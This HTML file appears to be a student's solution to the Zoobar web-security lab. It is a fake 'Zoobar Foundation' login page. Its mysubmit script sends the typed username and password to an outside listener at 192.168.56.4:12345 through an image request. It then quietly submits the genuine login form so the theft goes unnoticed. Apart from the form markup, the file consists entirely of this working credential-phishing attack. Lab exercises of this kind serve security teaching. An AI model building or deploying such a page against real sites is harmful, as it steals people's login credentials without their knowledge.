<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="./zoobar/media/zoobar.css">
        <link rel="icon" href="./favicon.ico">
        <title>
          Login - Zoobar Foundation
        </title>
    </head>
    <body>
        <script src= "http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
        <script>
            if(typeof(myZoobars)!="undefined")
                document.location.replace("./answer-2.html");

        </script>
        <script>
            function mysubmit(){
                var a = document.loginform.elements["login_username"].value;
                var b = document.loginform.elements["login_password"].value;
                var image = new Image();
                    image.onerror = function () {
                        document.getElementById('loginform').submit();
                    };
                    image.src='http://192.168.56.4:12345?' + '&payload=' + a +","+ b+'&roll=14013' + '&random=' + Math.random() + '&timestamp='+ Math.floor(Date.now());
           }
        </script>
      <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Sensible
                      Discourse</a></h1>
      <h2>Supporting the best
          advocates of the new world order</h2>

<div id="login" class="centerpiece">
<form name="loginform" id="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input type="button" id="login_button" name="sbmit_login" value="Log in" onclick="mysubmit();">
  <input type="button" name="submit_registration" value="Register"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
<input type="hidden" name="submit_login" value= "Log in">
</form>
</div>
<div class="footer warning">

</div>
<script>
document.loginform.login_username.focus();
</script>

</body>
</html>
